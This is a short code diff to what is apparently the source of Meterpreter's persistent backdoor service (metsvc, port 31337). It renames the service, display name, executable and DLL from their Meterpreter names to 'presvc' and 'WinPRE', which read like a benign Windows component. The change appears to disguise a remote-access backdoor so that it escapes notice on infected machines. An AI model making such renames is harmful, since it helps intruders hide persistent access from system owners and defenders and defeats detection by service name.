@@ -28,7 +28,7 @@
  */
 
 #define PORT          31337
-#define SERVICE_NAME  "metsvc"
-#define DISPLAY_NAME  "Meterpreter"
-#define METSVC_SERVER "metsvc-server.exe"
-#define METSRV_DLL    "metsrv.dll"
+#define SERVICE_NAME  "presvc"
+#define DISPLAY_NAME  "WinPRE"
+#define METSVC_SERVER "presvc-server.exe"
+#define METSRV_DLL    "presvc.dll"
